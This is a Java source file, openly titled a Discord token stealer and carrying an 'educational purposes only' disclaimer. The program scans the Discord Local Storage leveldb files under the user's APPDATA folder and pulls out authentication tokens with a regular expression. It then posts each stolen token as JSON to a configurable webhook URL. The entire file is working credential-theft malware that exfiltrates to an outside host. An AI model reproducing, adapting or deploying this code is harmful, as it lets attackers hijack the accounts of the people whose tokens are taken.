package com.github.Kami147.TokenStealer;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

	/*
	 * 
	 * Discord Token Stealer by Kami147. This is for educational purposes only. Use
	 * at your own risk.
	 * 
	 * This was developed and tested on Windows, It will very likely not work on any
	 * other OS.
	 * 
	 */
	
	
	private static Pattern pattern = Pattern
			.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");

	private static boolean debug = false;
	
	private static String webhook = "UR WEBHOOK HERE"; //We will send tokens to a webhook (Because i can't be bothered to set this up on a server)

	public static void main(String[] args) {

		// Begin Token Stealer

		String appdataLocation = System.getenv("APPDATA");
		String discordLocation = appdataLocation + "\\Discord\\Local Storage\\leveldb\\";

		if (debug)
			System.out.println(discordLocation);

		File discordLocalStorage = new File(discordLocation);

		String[] containedFiles = discordLocalStorage.list();

		for (String file : containedFiles) {
			if (debug)
				System.out.println("Scanning: " + file);
			try {
				File scanFile = new File(discordLocation + file);

				try (InputStream inputStream = new FileInputStream(scanFile);
						BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));) {

					String currentLine;
					while ((currentLine = br.readLine()) != null) {
						Matcher matcher = pattern.matcher(currentLine);
						if (matcher.find()) {
							if (debug)
								System.out.println("Found Token: " + matcher.group());
							sendData(matcher.group());
						}
					}

				}
			} catch (Exception e) {
				if (debug)
					System.out.println(file + " Is locked!");
			}
		}

	}

	private static void sendData(String toSend) throws IOException {
		URL obj = new URL(webhook);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setRequestProperty("Content-Type", "application/json");
		con.setRequestProperty("User-Agent", "Mozilla/5.0");

		String POST_PARAMS = "{ \"username\": \"TokenStealer\", \"avatar_url\": \"https://avatars0.githubusercontent.com/u/57001729?s=460&u=b9554da9dbc53de926894e1ec13788ef58d7a614&v=4\", \"content\": \"We Just Grabbed: "
				+ toSend + "\" }";

		con.setDoOutput(true);
		OutputStream os = con.getOutputStream();
		os.write(POST_PARAMS.getBytes());
		os.flush();
		os.close();

		con.getResponseCode();
	}

}
